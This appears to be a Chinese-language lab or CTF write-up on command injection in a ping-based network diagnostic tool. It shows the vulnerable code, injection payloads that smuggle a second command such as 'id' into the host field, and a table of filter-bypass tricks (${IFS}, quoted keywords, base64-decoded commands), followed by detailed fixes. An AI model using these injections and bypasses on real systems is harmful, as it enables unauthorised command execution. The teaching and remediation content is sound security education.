# 网络诊断工具里的命令注入

## 这一题在教什么

**把用户输入交给 shell，就等于把 shell 也交给了用户。**

这是所有注入类里后果最严重的一种 —— 一步到位就是命令执行，不需要再找别的路。

## 漏洞在哪

`module.py`：

```python
command = "ping -c 1 -W 1 " + host
output = subprocess.getoutput(command)
```

`subprocess.getoutput` 内部是 `/bin/sh -c <你给的字符串>`。
你输入里的 `;`、`&&`、`|`、`` ` ``、`$()` 对 shell 来说都是**语法**，不是普通字符。

## 怎么打通

```
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1$(id)
`id`
127.0.0.1%0aid          ← 换行也能当分隔符
```

输出里出现 `uid=` 就通关了。

**常见绕过手法（真实环境里过滤往往是半吊子）：**

| 过滤了什么 | 试试 |
|---|---|
| 空格 | `${IFS}`、`$IFS$9`、`<`、`%09`（Tab） |
| `;` `&` | 换行 `%0a`、`\|`、`` ` ``、`$()` |
| 关键字 `cat` | `c'a't`、`c\at`、`$(echo Y2F0 \| base64 -d)` |
| 全部命令都过白名单 | 想想参数注入：`ping -c 1 <host>` 的 host 位能不能变成 `-f` 或 `--help` |

## 怎么修

**第一原则：不要让 shell 参与。**

```python
import subprocess

result = subprocess.run(
    ["ping", "-c", "1", "-W", "1", host],   # 用 list，shell=False（默认）
    capture_output=True,
    text=True,
    timeout=5,
)
```

用 list 传参数时，`host` 永远只是 `ping` 的一个**参数值**，
`;` 就只是一个分号字符，不构成语法。

**第二层：白名单校验输入本身。**

```python
import re
if not re.fullmatch(r"[A-Za-z0-9.\-]{1,253}", host):
    abort(400)
```

主机名的合法字符集本来就很小，白名单完全够用。

**第三层：如果非要用 shell，`shlex.quote()`。**

```python
import shlex
command = "ping -c 1 -W 1 " + shlex.quote(host)
```

但这是兜底方案，能用 `subprocess` list 就别用 shell。

**配套：**

1. **降权**：这个进程不该以 root 跑。真被注入，损失范围小很多。
2. **容器/沙箱隔离**：让命令执行跑在受限环境里。
3. **别把命令回显给用户**（这题页面上回显只是为了教学）。

## 顺手想想

- 如果过滤器是 `host.replace(";", "")`，怎么绕？（提示：想想它删掉之后剩下的字符
  会不会重新拼出一个 `;`，以及别的分隔符）
- `subprocess.getoutput` / `os.system` / `os.popen` / `subprocess.run(shell=True)`
  这四种写法，哪些有 shell，哪些没有？
- 「参数注入」和「命令注入」有什么区别？
  为什么即使没有 shell，把用户输入当参数也可能出事（比如以 `-` 开头）？
